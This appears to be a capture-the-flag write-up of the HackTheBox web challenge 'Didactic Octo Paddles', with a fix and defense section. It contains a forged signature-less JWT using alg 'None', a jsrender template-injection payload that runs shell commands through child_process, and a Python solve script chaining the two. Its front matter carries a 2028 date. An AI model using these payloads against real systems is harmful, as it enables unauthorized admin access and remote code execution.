---
layout: post
title: "Didactic Octo Paddles"
date: 2028-01-28 09:00:00 -0500
categories: [HackTheBox, Challenges, Web]
tags: [hackthebox, challenge, web, jwt, algorithm-confusion, ssti, jsrender, rce]
---

## Overview

Didactic Octo Paddles is a Medium Web challenge — a Node/Express paddle shop with JWT sessions and an admin dashboard. Two bugs chain into remote code execution: a [JWT algorithm-confusion](https://cwe.mitre.org/data/definitions/347.html) bypass to reach `/admin`, and a [server-side template injection](https://cwe.mitre.org/data/definitions/1336.html) there that runs on attacker-controlled usernames.

## The technique

**Stage 1 — JWT `None` bypass.** The admin gate branches on the token's own `alg` header:

```js
const decoded = jwt.decode(sessionCookie, { complete: true });
if (decoded.header.alg == 'none') {                 // (A) exact-string reject
    return res.redirect("/login");
} else if (decoded.header.alg == "HS256") {          // (B) verify with the real secret
    jwt.verify(sessionCookie, tokenKey, { algorithms: [decoded.header.alg] });
} else {                                             // (C) verify with a NULL key
    jwt.verify(sessionCookie, null, { algorithms: [decoded.header.alg] });
}
```

Branch (A) rejects `alg == "none"` but the compare is an **exact string**. Branch (C) verifies anything else with a `null` key, and the `jwa` library matches algorithm names **case-insensitively** (`/…|^(none)$/i`). So a header `alg: "None"` (capital N) slips past (A) and (B), lands in (C), and is treated as the *none* algorithm — signature ignored, key irrelevant. Forge a signature-less token for the first-seeded user (`admin` = id **1**):

```
header  = base64url({"alg":"None","typ":"JWT"})
payload = base64url({"id":1})
token   = header + "." + payload + "."      # empty signature
```

**Stage 2 — jsrender SSTI.** The `/admin` handler compiles usernames *as a template*:

```js
const usernames = users.map(u => u.username);
res.render("admin", { users: jsrender.templates(`${usernames}`).render() });
```

Usernames come straight from the open `/register` endpoint, so a registered username that is a jsrender `{{: }}` expression tag runs on the server. The intuitive `{{:"".constructor.constructor("code")()}}` throws a jsrender *Syntax error*; the working form is `.toString.constructor.call({}, "code")()`:

```
{{:"pwn".toString.constructor.call({},"return process.mainModule.require('child_process').execSync('cat /flag.txt').toString()")()}}
```

`"pwn".toString.constructor` is `Function`; `Function.call(thisArg, body)` builds a function from the string body; `()` runs it.

## Solution

Create `solve.py`:

```python
import sys, json, base64, requests
host, port = sys.argv[1], sys.argv[2]
base = f"http://{host}:{port}"; s = requests.Session()
b64u = lambda b: base64.urlsafe_b64encode(b).rstrip(b"=").decode()
cmd = "cat /flag.txt"
payload = ('{{:"pwn".toString.constructor.call({},"return process.mainModule.require('
           "'child_process').execSync('" + cmd + "').toString()\")()}}")
s.post(base + "/register", json={"username": payload, "password": "x"})     # seed the SSTI
tok = b64u(json.dumps({"alg":"None","typ":"JWT"},separators=(",",":")).encode()) + "." \
    + b64u(json.dumps({"id":1},separators=(",",":")).encode()) + "."         # forge admin
r = s.get(base + "/admin", cookies={"session": tok})                         # SSTI fires
import re; print("FLAG:", re.search(r"HTB\{[^}]+\}", r.text).group(0))
```

```bash
python3 solve.py <target-ip> <target-port>
# FLAG: HTB{...}
```

One gotcha: all usernames are concatenated into a single template, so a malformed tag registered on an earlier attempt breaks every later render. Test the tag against the local `jsrender` package, then run once against a fresh instance.

## Why it worked

- **JWT:** the middleware trusted the token's own `alg` header to choose how to verify, and verified "other" algorithms with a `null` key — the `none` algorithm needs no key, so a case variant of `none` forges any claim.
- **SSTI:** user input was compiled as a **template**, not rendered as **data**. jsrender `{{: }}` tags evaluate arbitrary JS, and from any object you can reach `Function` and `process` → RCE.

## Fix / defense

- Never branch verification on the token's own `alg`; pin a fixed algorithm and a real key: `jwt.verify(token, secret, { algorithms: ["HS256"] })`. Never pass `null`/empty as the key, and reject `none` **case-insensitively**.
- Treat usernames as data: `res.render("admin", { users })` and let the view iterate and HTML-escape them (`{{>username}}`) — never `jsrender.templates(userControlled)`. Allow-list username characters at registration.
- Run the app unprivileged and keep the flag out of its reachable filesystem.
